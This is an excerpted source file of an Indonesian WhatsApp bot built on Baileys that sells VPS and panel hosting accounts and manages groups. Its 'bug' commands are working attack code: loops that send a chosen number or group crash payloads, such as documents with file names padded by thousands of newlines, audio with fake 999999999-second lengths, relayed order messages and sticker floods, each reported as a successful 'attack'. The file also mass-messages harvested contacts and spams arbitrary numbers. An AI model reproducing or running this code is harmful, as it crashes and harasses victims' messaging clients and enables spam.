module.exports = async (hanzz, m, store) => {
try {
...
const groupMetadata = isGroup ? await hanzz.groupMetadata(m.chat).catch(e => {}) : ''
...
if (m.sender.startsWith('212')) return hanzz.updateBlockStatus(m.sender, 'block')
...
list.push({
displayName: await hanzz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await hanzz.getName(i + '@s.whatsapp.net')}\n
FN:${await hanzz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
...
try {
ppuser = await hanzz.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
hanzz.relayMessage(jid, order.message, { messageId: order.key.id})
}
//jam waktu
...
// Function Reply
const reply = (teks) => { 
hanzz.sendMessage(from, { text: teks}, { quoted: m }) }
...
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `HanzzBotz`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;HanzzBotz,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/3c485ff201d9337be14ef.jpg' }}}}
...
hanzz.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nPesan Anda Telah Di Hapus`}, {quoted:m})
hanzz.groupParticipantsUpdate(m.chat, [sender], 'delete')
hanzz.sendMessage(m.chat, { delete: m.key })
}
}
...
hanzz.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: hw })
}
break
...
`
hanzz.sendMessage(from, { text: cvps, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: hw })
}
break

case "sisadroplet":{
if (!isOwner) return reply(`Ngapain Woi Tolol Yatim`)
...
case "restartvps": {
    if (!isOwner) return reply(`Idih Yatim So Asik Kontol`)
...
case "turnoff": {
  if (!isOwner) return reply(`Yatim Kontol Rese`);
    ...
    try {
      ...
      if (response.ok) {
        ...
        if (vpsInfo.ok) {
          ...
          await sleep(60000) 
 hanzz.sendMessage(m.chat, { text: textvps });
        } else {
...
hanzz.sendMessage(mq1, {text:`*───❖》Rafathar Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
 ...
 case "listdroplet": {
  ...
  try {
    ...
    getDroplets().then(droplets => {
      ...
      hanzz.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
 ...
 case "cekdroplet": {
  ...
  getDropletInfo(dropletId)
    ...
    .catch((err) => {
      reply(err);
      hanzz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });
...
chpasswd: { expire: False }`;
    ...
    if (response.ok) {
      ...
      await hanzz.sendMessage(m.chat, { text: messageText });
    } else {
...
⭔ ${prefix}😎 62xx|Jumblah
 ...
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
hanzz.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "panelmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const texthanz = `*Hi @${sender.split("@")[0]} 👋*
...
╰━─━─━〘 Powered By *@${owned.split("@")[0]}* 〙━─━─━
▬▭▬▭▬▭▬▭▬▭▬▭▬`
hanzz.sendMessage(from, { text: texthanz, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "bugmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text13 = `*Hi @${sender.split("@")[0]} 👋*
...
⭔ ${prefix}bugemoji
 ...
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
hanzz.sendMessage(from, { text: text13, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "groupmenu": {
...
╭━─━─『 *MENU OWNER* 』─━─━
│ ${prefix}addowner3 *nomor*
│ ${prefix}delowner3 *nomor*
│ ${prefix}addprem3 *nomor*
│ ${prefix}delprem3 *nomor*
╰━─━─━─━─`
reply(txtow)
}
break
...
_LIST MENU BUG BY *© RafatharOffcial*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
...
│
╰━─━─━〘Powered By *@${owned.split("@")[0]}* 〙━─━─━`
hanzz.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
case 'domain':{
m.reply(Domain = `
...
┗━━━━━━━━━━━━━━━━━━━`);
  ...
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      hanzz.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
...
*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
        ...
        case "buyowner":
if (cekSaldo(sender,db_saldo) < 10000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await hanzz.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
let ceknya = await hanzz.onWhatsApp(prrkek)
...
break
          case 'qris': {
hanzz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8c3b1ac5dd4b211569b2b.jpg' }, caption: `_Atau Kirim Ke Nomor *085817104096*_ 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
hanzz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8c3b1ac5dd4b211569b2b.jpg' }, caption: `_Jangan Lupa Screenshoot Bukti Transfer_ 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
...
${prefix}dana✅
${prefix}qris✅`
        hanzz.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
    case "buysrv": {
...
Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
hanzz.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case 'acc':{
...
hanzz.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
hanzz.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
hanzz.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
hanzz.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
hanzz.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
hanzz.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
...
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
...
break
        //bagian panel
        case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
let d = (await hanzz.onWhatsApp(sender.split('@')[0]))[0] || {}
...
5GB ✅
UNLI ✅`
hanzz.sendMessage(from, {text : lrm}, {quoted : m})
break 
        case "panel": {
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*
...
let sections = []
let teks = `*Berikut List Server Panel Hanzz*`
...
teks += `\n▬▭▬▭▬▭▬▭▬\n*Total Server Hanzz : ${res.meta.pagination.count}*`
await hanzz.sendMessage(from, {text: teks})
}
break
...
let users = res.data
let sections = []
let teks = `*Berikut List User Panel Hanzz*\n`
for (let user of users) {
let u = user.attributes
teks += `▬▭▬▭▬▭▬▭▬\n*Id:* ${u.id}\n*Username :* ${u.username}\n*Email :* ${u.email}\n`
}
teks += `\n▬▭▬▭▬▭▬▭▬\n\n*Total User Panel Hanzzz : ${res.meta.pagination.count}*\n`
await hanzz.sendMessage(from, {
text: teks,
...
Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await hanzz.onWhatsApp(u.split`@`[0]))[0] || {}
...
let p = await hanzz.sendMessage(m.chat, { text: `
...
hanzz.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
...
`
    ...
    await hanzz.sendMessage(m.chat, listMessage)

    await hanzz.sendMessage(nomornya, {
...
`,
  ...
  await hanzz.sendMessage(m.chat, { text: messageText }, { quoted: m });
...
CREATED AT: ${server.created_at}`)
        ...
        break
        case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 2000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
...
`
hanzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: hanzz.chat })
...
let server = res.attributes
let p = await m.reply(`
*Data Akun Sudah Terkirim Ke Pembeli*
`)
...
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 12000) return hanzz.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendMessage(prrkek, { text: "Bug🔥`" }, { quoted: lep })
hanzz.sendMessage(prrkek, { text: "Bug🔥`" }, { quoted: lep })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendMessage(prrkek, { document: thumb, caption: "Bug🔥`", fileName: `Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
hanzz.sendMessage(prrkek, { document: thumb, caption: "Rafathar Offcial`", fileName: `Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendStimg(prrkek, ppuser, lep, { packname: "Bug🔥", author: "" })
hanzz.sendStimg(prrkek, ppuser, lep, { packname: "Bug🔥", author: "" })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Rafathar Offcial`",
"message": `${button}`,
...
hanzz.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
hanzz.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
let mnm = await hanzz.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendMessage(mnm, { text: "Bug🔥`" }, { quoted: lep })
hanzz.sendMessage(mnm, { text: "Bug🔥`" }, { quoted: lep })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendMessage(mnm, { document: thumb, caption: "bug`", fileName: `⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
hanzz.sendMessage(mnm, { document: thumb, caption: "YOUTUBE `", fileName: `⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
hanzz.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
hanzz.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
hanzz.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
hanzz.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
...
let encmedia = await hanzz.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await hanzz.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
case "qc": {
if (!quoted){
const getname = await hanzz.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
...
hanzz.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
...
break
case "owner": {
const repf = await hanzz.sendMessage(from, { 
contacts: { 
...
hanzz.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
...
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await hanzz.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await hanzz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await hanzz.groupMetadata(x)
...
reply(mess.wait)
const groupMetadataa = !isGroup? await hanzz.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
...
if (/image/.test(mime)) {
media = await hanzz.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await hanzz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await hanzz.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
...
await hanzz.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
...
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await hanzz.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
...
await hanzz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await hanzz.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
...
await hanzz.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
...
hanzz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
...
const url = await hanzz.groupInviteCode(m.chat)
...
global.hit = q
hanzz.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
...
await hanzz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isGroup) return reply(mess.only.group)
...
await hanzz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isGroup) return reply(mess.only.group)
...
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hanzz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isGroup) return reply(mess.only.group)
...
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hanzz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "antilink":{
if (!isGroup) return reply(mess.only.group)
...
console.log(e)
hanzz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}
